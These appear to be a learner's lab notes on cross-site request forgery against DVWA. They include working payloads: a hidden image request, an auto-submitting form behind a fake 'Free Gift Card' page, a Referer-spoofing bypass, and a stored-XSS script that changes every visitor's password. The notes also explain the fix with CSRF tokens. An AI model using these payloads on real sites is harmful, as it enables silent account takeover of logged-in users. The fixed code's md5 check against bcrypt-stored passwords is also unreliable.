# Day 14 Notes — CSRF (Cross-Site Request Forgery)

---

## 1. What We Did Today Overview

- Built complete foundation understanding of why CSRF exists
- Analyzed the legitimate password change request in Burp
- Read and understood the vulnerable PHP source code line by line
- Built a CSRF attack page using auto-submitting form technique
- Successfully changed admin password without victim's knowledge
- Bypassed Medium security Referer check via Burp Repeater
- Confirmed attack success by logging in with the changed password
- Understood the complete fix including CSRF tokens

---

## 2. The Foundation — Why CSRF Exists

### The core browser behavior that makes CSRF possible

When you log into a website your browser receives a session cookie. From that point forward your browser automatically attaches that cookie to every single request it makes to that domain — whether YOU initiated the request or not.

This automatic cookie attachment is by design — it's how websites keep you logged in. But it creates a fundamental problem:

**If an attacker can get your browser to make a request to a site you're logged into — your browser attaches your session cookie automatically — and the server thinks YOU made the request.**

The server cannot tell the difference between:
- A request YOU made by clicking a button on the site
- A request an ATTACKER'S PAGE triggered silently in the background

Both arrive at the server with your valid session cookie attached.

### The real world analogy

You are logged into your bank in one browser tab. You open another tab and visit a malicious website. That website has hidden code that tells your browser to send a money transfer request to your bank. Your browser does it automatically — attaching your bank session cookie. The bank receives what looks like a completely legitimate transfer request from you and processes it.

You never clicked anything on the bank site. You never saw the request happen. The money is gone.

### What CSRF can do

CSRF cannot:
- Steal your password or session cookie
- Read your data from the target site
- Intercept your traffic

CSRF can only:
- Make your browser perform **actions** you didn't intend
- Change your password
- Change your email address
- Transfer money
- Make purchases
- Delete your account
- Add an attacker as admin

The impact depends entirely on what actions the target site allows via simple requests.

### The three conditions required for CSRF

All three must be true for CSRF to work:

**Condition 1 — Victim is logged in**
Active session must exist. No session = no cookie = no CSRF.

**Condition 2 — Server relies only on cookies for authentication**
If the server checks ONLY the session cookie to verify the request is legitimate — CSRF works. If it requires additional verification like a CSRF token — it doesn't.

**Condition 3 — Attacker can predict the request parameters**
Attacker must know what the request looks like. If changing password requires the current password — CSRF is much harder. If it only needs the new password — CSRF is trivial.

---

## 3. The Legitimate Request — What We Intercepted in Burp

This is the raw HTTP request captured when legitimately changing the password in DVWA:

```
GET /vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://127.0.0.1/vulnerabilities/csrf/
Cookie: PHPSESSID=f34qj17u195eg5o4q3kt4tmtv4; security=low
Upgrade-Insecure-Requests: 1
```

### Breaking down every critical part

**The method — GET for a state change:**
```
GET /vulnerabilities/csrf/?password_new=test123...
```
A password change is happening via GET request. This is wrong by design. The rule is:
- GET = retrieve data, never change it
- POST = change data

Using GET for state-changing actions makes CSRF trivially easy because GET requests can be triggered by simply loading an image URL — no user interaction required. It also means:
- Password appears in browser history in plain text
- Password appears in server logs in plain text
- Password leaks via Referer header to any external site linked from the page

**The Referer header:**
```
Referer: http://127.0.0.1/vulnerabilities/csrf/
```
Shows the request came from the DVWA CSRF page — because you legitimately submitted the form. When the CSRF attack fires from a malicious page this will show the attacker's URL instead. This is what Medium security checks — and what we bypassed.

**The cookie — automatically attached:**
```
Cookie: PHPSESSID=f34qj17u195eg5o4q3kt4tmtv4; security=low
```
Your browser attached this automatically. You didn't add it — the browser did it because the request goes to `127.0.0.1`. When your attack page triggers a request to DVWA — the browser attaches this same cookie automatically even though the request originated from a completely different page.

**What is missing — the critical observation:**
There is no CSRF token anywhere in this request. No hidden field, no custom header, nothing secret that proves this request came from DVWA's own page. The server accepts it based purely on the session cookie.

---

## 4. The Vulnerable PHP Source Code — Line by Line

```php
<?php
if( isset( $_GET[ 'Change' ] ) ) {
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    if( $pass_new == $pass_conf ) {
        $pass_new = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $pass_new);
        $pass_new = md5( $pass_new );

        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"], $insert);

        echo "<pre>Password Changed.</pre>";
    }
    else {
        echo "<pre>Passwords did not match.</pre>";
    }
}
?>
```

### Line by line explanation

**Line 1:**
```php
if( isset( $_GET[ 'Change' ] ) ) {
```
The entire password change logic runs if the `Change` parameter exists in the GET request. That's the only gate. No check for who is making the request. No check for where it came from. Just — does this parameter exist in the URL? Yes? Execute the password change.

This means ANY request to this URL with `Change=Change` triggers a password change — whether you sent it or an attacker's HTML page did.

**Lines 2-3:**
```php
$pass_new  = $_GET[ 'password_new' ];
$pass_conf = $_GET[ 'password_conf' ];
```
Takes the new password values directly from GET parameters. No validation of who is asking. Values come straight from the URL.

**Line 4:**
```php
if( $pass_new == $pass_conf ) {
```
The ONLY check — do the two password fields match? That's it. No check for:
- Did the user provide their current password to prove they know it?
- Is there a CSRF token proving this came from our own page?
- Did this request originate from a trusted source?
- Is there a minimum password length?

**Line 5:**
```php
$pass_new = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $pass_new);
```
Escapes special characters to prevent SQL injection. Correct — but only prevents SQLi. Does absolutely nothing to prevent CSRF. The developer fixed one problem and ignored another completely.

**Line 6:**
```php
$pass_new = md5( $pass_new );
```
Hashes the password with MD5 before storing. You already know MD5 is weak — crackable in seconds on crackstation.net. Should be bcrypt or Argon2.

**Line 7:**
```php
$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
```
Updates the password for the currently logged in user. `dvwaCurrentUser()` reads the session cookie to identify who is logged in. This is the exact reason CSRF works — the cookie is valid because the browser attached it automatically, so `dvwaCurrentUser()` returns `admin` and the admin password gets changed.

**Line 8:**
```php
echo "<pre>Password Changed.</pre>";
```
Silent success. No email notification to the real user. No "your password was just changed" alert. No logging of the IP that made the change. The victim has no idea this happened.

### The complete vulnerability flow

```
Attacker creates malicious HTML page
        ↓
Victim visits page while logged into DVWA
        ↓
Page auto-submits hidden form to DVWA password change URL
        ↓
Browser automatically attaches victim's session cookie
        ↓
Code checks: does Change parameter exist? YES
        ↓
Code checks: do passwords match? YES (attacker controls both)
        ↓
dvwaCurrentUser() reads cookie — returns 'admin'
        ↓
UPDATE users SET password='hacked' WHERE user='admin'
        ↓
echo "Password Changed" — silent success
        ↓
Victim's password changed — they have no idea
```

The code never once asked: did the real user intend this request?

---

## 5. Building the CSRF Attack — What We Tried and What Worked

### Attempt 1 — img tag (basic)

```html
<img src="http://127.0.0.1/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none">
```

**What happened:** Browser showed broken image icon — the request fired but the response was HTML not an image so the browser showed an error icon. The attack still worked but was visually detectable.

**Why img works conceptually:** The browser makes a GET request to load any img src — it automatically attaches cookies for that domain. The DVWA server processes it as a legitimate password change.

---

### Attempt 2 — iframe (failed on modern Firefox)

```html
<iframe src="http://127.0.0.1/vulnerabilities/csrf/..." style="display:none"></iframe>
```

**What happened:** Blank page — attack did not fire.

**Why it failed:** Modern Firefox blocks requests from `file:///` pages to `http://127.0.0.1` treating it as a cross-origin security violation. Browsers have gotten stricter about this over time. In a real attack scenario where both pages are on HTTP/HTTPS domains this would work — but locally the file:// to http:// combination triggers browser protections.

---

### Attempt 3 — Auto-submitting form (worked perfectly)

```html
<!DOCTYPE html>
<html>
<head>
    <title>Free Gift Card!</title>
</head>
<body>
    <h1>Click here to claim your prize!</h1>

    <form id="csrfForm"
          action="http://127.0.0.1/vulnerabilities/csrf/"
          method="GET">
        <input type="hidden" name="password_new" value="hacked">
        <input type="hidden" name="password_conf" value="hacked">
        <input type="hidden" name="Change" value="Change">
    </form>

    <script>
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```

**What happened:**
1. Opened attack page in Firefox while logged into DVWA in another tab
2. Page loaded — JavaScript fired immediately — form submitted automatically
3. Browser redirected to DVWA showing "Password Changed"
4. Logged out → tried `admin` / `password` → FAILED
5. Tried `admin` / `hacked` → SUCCESS
6. Attack confirmed — password changed without victim's knowledge

**Why auto-submitting form works better than iframe:**
- Form submits directly to DVWA — not through a nested context
- Browser attaches session cookie automatically — it's a direct request to the target domain
- JavaScript fires on page load — zero user interaction required
- Victim just needs to have the page open — they don't need to click anything
- This is the standard CSRF Proof of Concept format used in real bug bounty reports

**Why the victim doesn't suspect anything:**
The attacker can make the page look completely legitimate — "Free Gift Card", "Your order is confirmed", anything. The form submission happens in the background. By the time the victim wonders why they got redirected — the attack is done.

---

## 6. Medium Security — Referer Header Check

### What Medium security does

Medium security checks the Referer header of the password change request. It verifies that the request came from the same server:

```php
if( stripos( $_SERVER[ 'HTTP_REFERER' ] , $_SERVER[ 'SERVER_NAME' ] ) !== false ) {
    // Process the request
}
```

Translation: does the Referer header contain `127.0.0.1`? If not — reject.

When the CSRF attack fires from the malicious page the Referer header shows the attacker's URL — not `127.0.0.1`. So Medium security rejects it.

### How we bypassed it — Burp Repeater

1. Intercepted the CSRF request in Burp
2. Sent to Repeater
3. Manually added the correct Referer header:
```
Referer: http://127.0.0.1/vulnerabilities/csrf/
```
4. Sent the request → password changed → bypass successful

### Why Referer is a weak defence

The Referer header is:
- **Client controlled** — can be modified in Burp in seconds
- **Not always sent** — some browsers suppress it for privacy
- **Suppressible by attackers** — `<meta name="referrer" content="no-referrer">` removes it
- **Spoofable** — in some configurations can be set to any value

Referer checking is not a reliable CSRF defence. It provides a small speed bump — not real security.

---

## 7. Chain Thinking — CSRF + XSS

### Standalone CSRF limitation
Standalone CSRF requires tricking the victim into visiting your malicious page. You need to send them a link via email, social media, or another channel. The victim has to take an action — click the link.

### CSRF + XSS — the powerful combination

If the target site has stored XSS anywhere you can inject the CSRF attack directly into the site. Now every user who simply visits the page with the stored XSS gets attacked — no need to trick anyone into visiting an external page.

**The combined attack:**
```javascript
<script>
var form = document.createElement('form');
form.action = 'http://127.0.0.1/vulnerabilities/csrf/';
form.method = 'GET';

var p1 = document.createElement('input');
p1.name = 'password_new';
p1.value = 'hacked';
form.appendChild(p1);

var p2 = document.createElement('input');
p2.name = 'password_conf';
p2.value = 'hacked';
form.appendChild(p2);

var p3 = document.createElement('input');
p3.name = 'Change';
p3.value = 'Change';
form.appendChild(p3);

document.body.appendChild(form);
form.submit();
</script>
```

Inject this as stored XSS → every visitor gets their password changed automatically → no external page needed → no suspicious link to click.

### Severity upgrade

| Finding | Severity | Why |
|---|---|---|
| CSRF alone | Medium | Requires tricking victim into clicking link |
| XSS alone | High | Can steal cookies, perform actions |
| CSRF + XSS combined | Critical | Affects every visitor automatically, no interaction needed |

This is exactly why chain thinking matters. Two Medium/High findings combined become Critical. That's the difference between a $200 report and a $5000 report in bug bounty.

---

## 8. The Complete Fix

### What the vulnerable code lacks

1. No CSRF token
2. Uses GET instead of POST
3. No current password verification
4. Uses MD5 instead of bcrypt
5. No notification to user when password changes

### The fixed code

```php
<?php
session_start();

// Generate CSRF token when page loads
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

if (isset($_POST['Change'])) {
    // Step 1 — Verify CSRF token
    if (!isset($_POST['csrf_token']) ||
        $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die("CSRF attack detected — request blocked");
    }

    // Step 2 — Verify current password
    $current_pass = $_POST['password_current'];
    $pass_new = $_POST['password_new'];
    $pass_conf = $_POST['password_conf'];

    if ($pass_new === $pass_conf) {
        // Step 3 — Use prepared statements
        $stmt = $pdo->prepare(
            "UPDATE users SET password=? WHERE user=? AND password=?"
        );
        $stmt->execute([
            password_hash($pass_new, PASSWORD_BCRYPT),
            dvwaCurrentUser(),
            md5($current_pass)
        ]);

        // Step 4 — Regenerate token after use
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));

        echo "Password changed successfully";
    }
}
?>

<form method="POST" action="#">
    <!-- CSRF token hidden in form -->
    <input type="hidden"
           name="csrf_token"
           value="<?= $_SESSION['csrf_token'] ?>">

    Current password:
    <input type="password" name="password_current"><br>
    New password:
    <input type="password" name="password_new"><br>
    Confirm password:
    <input type="password" name="password_conf"><br>
    <input type="submit" name="Change" value="Change">
</form>
```

### Why the CSRF token fix works

The token is a random secret value generated by the server and embedded in every form. When the form is submitted the server checks that the token in the request matches the one it generated.

The attacker cannot include a valid token because:
- They can't read the token value — same-origin policy blocks cross-origin reads
- The token is different for every user and every session
- Even if they know the URL they don't know the token

Without the correct token — request is rejected.

### The four fixes explained

| Fix | Why it works |
|---|---|
| POST instead of GET | Can't be triggered by img src or simple URL visit |
| CSRF token | Attacker can't read it — same-origin policy |
| Current password required | Even with CSRF attacker needs to know current password |
| bcrypt instead of MD5 | If DB is compromised passwords can't be cracked in seconds |

---

## 9. CSRF in Real Bug Bounty

### Where to look for CSRF

High value targets for CSRF in real applications:
- Password change forms
- Email change forms
- Payment and transfer actions
- Account deletion
- Admin actions (add user, change permissions)
- Settings pages

### How to test for CSRF

1. Find a state-changing action (changes data on the server)
2. Intercept the request in Burp
3. Check: is there a CSRF token in the request?
4. If no token → build a PoC HTML page
5. Open PoC in browser while logged into target in another tab
6. Confirm action was performed without your explicit approval

### Real world CSRF findings

CSRF has been found in:
- Facebook — account settings pages — paid $25,000
- Twitter — various actions
- Shopify — admin panel actions
- WordPress — comment and settings actions

CSRF on a password change or email change is always High severity. CSRF on a low-impact action (like changing a display preference) is Low severity.

---

## 10. Key Concepts Summary

| Term | Meaning |
|---|---|
| CSRF | Forging requests on behalf of a logged-in user using automatic cookie attachment |
| Session cookie | Automatically attached to every request to a domain — the root cause of CSRF |
| State-changing action | Any action that modifies data — these are CSRF targets |
| CSRF token | Random secret embedded in forms — attacker can't read it — blocks CSRF |
| Same-origin policy | Browser rule — pages can't read responses from different origins — why attacker can't steal the token |
| Referer header | Shows where request came from — weak defence — bypassable in Burp |
| Auto-submitting form | HTML page that submits a hidden form on load — standard CSRF PoC technique |
| CSRF + XSS chain | Stored XSS used to deliver CSRF attack — no victim interaction needed — Critical severity |
| SameSite=Strict | Cookie flag that prevents cookie being sent on cross-site requests — strong CSRF defence |
| dvwaCurrentUser() | PHP function that reads session cookie to identify logged-in user |

---

## 11. Foundation Checklist

Before moving to Day 15 confirm you can answer all of these from memory:

```
What causes CSRF? (the browser behavior that makes it possible)
What three conditions must be true for CSRF to work?
Why can't the attacker include a valid CSRF token in their forged request?
What is the difference between CSRF and XSS?
How does CSRF + XSS create a Critical finding?
Why is checking the Referer header a weak defence?
What does SameSite=Strict do and why does it prevent CSRF?
Can you build a CSRF PoC HTML page from scratch without help?
```

---
